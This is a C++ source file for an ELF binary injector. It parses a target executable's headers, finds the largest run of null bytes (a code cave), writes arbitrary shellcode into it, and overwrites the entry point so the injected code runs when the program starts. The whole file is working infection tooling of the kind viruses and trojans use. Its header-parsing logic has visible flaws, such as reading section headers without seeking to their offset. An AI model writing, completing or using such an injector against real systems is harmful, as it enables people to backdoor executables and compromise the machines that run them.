#include "injector.hpp"
#include <elf.h>
#include <exception>
#include <fcntl.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

using namespace std;

Elf_target::Elf_target(string name) {
  fd = open(name.c_str(), O_RDWR);
  if (fd == -1) {
    throw invalid_argument{"can't open file"};
  }
}

Elf_target::~Elf_target() { close(fd); }

void Elf_target::load_headers() {
  Elf_target::load_main_header();
  Elf_target::load_program_headers(program_headers, header.e_phnum);
  Elf_target::load_program_headers(section_headers, header.e_shnum);
}

void Elf_target::load_main_header() {
  read(fd, static_cast<void *>(&header), sizeof(Elf64_Ehdr));
}

template <typename T>
void Elf_target::load_program_headers(vector<T> &vector, int count) {
  for (size_t i{}; i < count; i++) {
    vector.push_back(get_header_type<T>());
  }
}

template <typename T> T Elf_target::get_header_type() {
  T object{};
  read(fd, &object, sizeof(object));
  return object;
}

bool Elf_target::is_elf(void) {
  bool elf = true;
  elf &= header.e_ident[0] == ELFMAG0;
  elf &= header.e_ident[1] == ELFMAG1;
  elf &= header.e_ident[2] == ELFMAG2;
  elf &= header.e_ident[3] == ELFMAG3;
  return elf;
}

Elf_target::code_cave_t Elf_target::find_biggest_code_cave(void) {
  lseek(fd, 0, SEEK_SET);
  size_t biggest_offset{0};
  size_t biggest_found{0};
  size_t cur_cave{0};
  char byte{0};

  while (read(fd, &byte, 1)) {
    if (byte == '\0') {
      cur_cave++;
    } else {
      if (cur_cave > biggest_found) {
        biggest_found = cur_cave;
        biggest_offset = lseek(fd, 0, SEEK_CUR) - cur_cave;
      }
      cur_cave = 0;
    }
  }

  return {biggest_offset, biggest_found};
}

bool Elf_target::write_shellcode(vector<unsigned char> &shellcode,
                                 const code_cave_t &code_cave) {
  if (code_cave.size < shellcode.size()) {
    return false;
  }

  lseek(fd, code_cave.offset, SEEK_SET);
  cout << hex << (int)shellcode.data()[0] << endl;
  cout << hex << (int)shellcode.data()[1] << endl;
  cout << hex << (int)shellcode.data()[2] << endl;
  cout << hex << (int)shellcode.data()[3] << endl;
  write(fd, shellcode.data(), shellcode.size());
  return true;
}

void Elf_target::change_entry_point(uint64_t new_entry_point) {
  cout << "new entry point: 0x" << hex << new_entry_point << endl;
  header.e_entry = new_entry_point;
  lseek(fd, 0, SEEK_SET);
  cout << "write: " << write(fd, &header, sizeof(header)) << endl;
}
